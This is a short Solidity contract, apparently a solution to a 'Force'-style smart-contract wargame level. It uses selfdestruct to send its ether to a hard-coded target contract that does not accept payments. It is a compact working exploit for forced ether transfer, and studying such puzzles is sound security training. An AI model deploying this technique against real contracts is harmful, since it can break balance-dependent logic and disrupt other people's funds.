// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

// version 0.8.18 deprecates selfdestruct, however it is still
// allowed to be used.

contract L8_Caller__Force {
    address payable public forceContract =
        payable(0x81E625BBe6B3cda49363Eb5Db350b148387bE856);

    constructor() payable {}

    function forceFundsTransfer() public {
        selfdestruct(forceContract);
    }
}
